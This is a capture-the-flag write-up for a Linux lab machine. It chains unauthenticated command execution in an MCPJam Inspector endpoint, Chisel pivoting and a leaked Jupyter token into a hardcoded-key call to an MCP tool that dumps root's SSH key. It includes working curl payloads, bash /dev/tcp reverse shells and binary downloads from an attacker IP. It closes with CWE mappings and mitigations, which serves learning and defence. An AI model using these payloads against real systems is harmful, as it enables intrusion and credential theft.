# DevHub - HackTheBox Writeup

**OS:** Linux (Ubuntu)  
**Stack:** nginx, MCPJam Inspector, JupyterLab, Python MCP server  
**Techniques:** Blind RCE in an MCP endpoint, Chisel pivoting, hardcoded credentials, root SSH key dump

---

## Attack Chain Overview

```text
MCPJam Inspector on port 6274
  -> blind RCE in /api/mcp/connect
  -> reverse shell as mcp-dev
  -> internal processes reveal JupyterLab on 8888 and opsmcp on 5000
  -> Chisel pivot to loopback-only services
  -> JupyterLab token exposed in process arguments
  -> shell as analyst
  -> /opt/opsmcp/server.py contains a hardcoded API key
  -> ops._admin_dump returns root private SSH key
  -> SSH as root
```

---

## Reconnaissance

### Port Scan

```bash
nmap -sS --min-rate 5000 -p- -Pn -n --open $TARGET -oN silent
nmap -sVC -p 22,80,6274 $TARGET -oN service
```

**Open ports:**

| Port | Service | Detail |
|------|---------|--------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu |
| 80/tcp | HTTP | nginx 1.18.0 - "DevHub - Internal Development Platform" |
| 6274/tcp | MCPJam Inspector | MCP server for LLM/tool interaction |

Port `6274` exposed **MCPJam Inspector**, a server that can launch executable tools for model-driven workflows. It was reachable without authentication or execution restrictions.

---

## Initial Access - MCPJam Inspector RCE

Full technique: [mcp-api-injection.md](../../../exploits/web-rce/mcp-api-injection.md).

### Vulnerability Identification

The `POST /api/mcp/connect` endpoint accepts a JSON `command` field and executes it directly on the system without validation or authentication:

```bash
curl -X POST http://$TARGET:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'
```

**Response:**

```json
{"success":false,"error":"Connection failed... MCP error -32000: Connection closed"}
```

The error indicates **blind RCE**: the command runs, but the process closes before output is returned.

### Reverse Shell as `mcp-dev`

```bash
# Listener on Kali
nc -lvnp 4444

# Reverse shell payload
curl -X POST http://$TARGET:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"/bin/bash","args":["-c","bash -i >& /dev/tcp/LHOST/4444 0>&1"],"env":{}},"serverId":"revshell"}'
```

The shell landed as `mcp-dev` (uid=1001).

---

## Internal Enumeration

```bash
id
# uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)

ps aux
# analyst  1026  ... jupyter-lab --ip=127.0.0.1 --port=8888
#                    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
# root     1038  ... python3 /opt/opsmcp/server.py

ss -tulnp
# 127.0.0.1:5000  -> opsmcp (running as root)
# 127.0.0.1:8888  -> JupyterLab (running as analyst)
```

Two useful services were bound to loopback only: **JupyterLab** as `analyst` and **opsmcp** as `root`.

---

## Pivoting With Chisel

Full tool note: [chisel.md](../../../tools/pivot/chisel.md).

Expose the internal loopback services back to Kali:

```bash
# Kali - Chisel server
./chisel server -p 9001 --reverse --socks5

# Victim - transfer and execute
cd /tmp
wget http://10.10.14.92:8000/chiselE
chmod +x chisel

# Option A - SOCKS5 proxy
./chisel client 10.10.14.92:9001 R:socks &

# Option B - direct remote port forward to JupyterLab
./chisel client 10.10.14.92:9001 R:8889:127.0.0.1:8888 &
```

With option B, JupyterLab became reachable from Kali at `http://localhost:8889`.

---

## JupyterLab Access -> Shell as `analyst`

The JupyterLab token was exposed in process arguments and readable with unprivileged `ps aux`:

```text
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Browse to `http://localhost:8889/token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7`, open the integrated JupyterLab terminal and run:

```bash
# Listener on Kali
nc -lvnp 5555

# JupyterLab terminal
bash -i >& /dev/tcp/LHOST/5555 0>&1
```

The shell landed as `analyst`.

---

## `opsmcp` Service Analysis

```bash
cat /opt/opsmcp/server.py
```

**Critical findings:**

```python
# Hardcoded API key
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Hidden tool without real access control
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    }
}
```

The `_admin_dump` function can dump `ssh_keys`, `passwords` and `tokens` using only the static API key for authentication.

**Additional hardcoded credentials:**

| User | Password |
|------|----------|
| analyst | `JupyterN0tebook!2026` |
| mcp-dev | `Mcp!Insp3ct0r2026` |
| root | `$6$rounds=656000$saltsalt$hashedpassword` |

---

## Privilege Escalation - Root SSH Key Dump

Full technique: [mcp-admin-dump-credential-leak.md](../../../exploits/web-disclosure/mcp-admin-dump-credential-leak.md).

### Step 1 - Enable Debug Mode

```bash
curl -X POST http://localhost:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._debug_mode","arguments":{}}'
```

### Step 2 - Dump Root's Private SSH Key

```bash
curl -X POST http://localhost:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The response returns the complete root private SSH key.

### Step 3 - SSH as `root`

```bash
vim id_rsa        # paste the recovered private key
chmod 600 id_rsa
ssh -i id_rsa root@$TARGET
cat /root/root.txt
```

---

## Summary

| Phase | Technique | Detail |
|-------|-----------|--------|
| Foothold | Blind RCE in MCPJam Inspector | Unauthenticated `command` execution in `/api/mcp/connect` |
| Pivoting | Chisel port forward | Access to JupyterLab on 8888 and opsmcp on 5000 |
| Lateral | JupyterLab token exposed in `ps aux` | Shell as `analyst` |
| Privesc | Hardcoded credentials in `server.py` | API key -> `ops._admin_dump` -> root SSH key |
| Root | SSH with dumped private key | Direct root login |

---

## Exploited Vulnerabilities

| CWE | Description |
|-----|-------------|
| CWE-306 | Missing Authentication - `/api/mcp/connect` had no authentication |
| CWE-78 | OS Command Injection - command execution without sanitization |
| CWE-798 | Hard-coded Credentials - API key and passwords in source code |
| CWE-862 | Missing Authorization - `_admin_dump` had no per-tool access control |
| CWE-214 | Sensitive Information in process arguments - Jupyter token exposed through `ps aux` |

---

## Mitigations

- Require authentication on every exposed endpoint.
- Validate and sanitize all input; use command allowlists if command execution is unavoidable.
- Do not hardcode credentials; use environment variables or a secrets manager.
- Enforce RBAC and least privilege per tool/action.
- Do not expose tokens in process arguments; use restricted config files or secret stores.
- Remove debug and dump functionality from production services.

---

## References

- [Chisel - Fast TCP/UDP tunnel](https://github.com/jpillora/chisel)
- [MCPJam Inspector](https://github.com/MCPJam/inspector)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [curl](../../../tools/web/curl.md)
- [netcat](../../../tools/pivot/netcat.md)
- [chisel](../../../tools/pivot/chisel.md)
- [mcp-api-injection](../../../exploits/web-rce/mcp-api-injection.md)
- [mcp-admin-dump-credential-leak](../../../exploits/web-disclosure/mcp-admin-dump-credential-leak.md)
- [bash-tcp](../../../payloads/reverse-shells/bash-tcp.md)
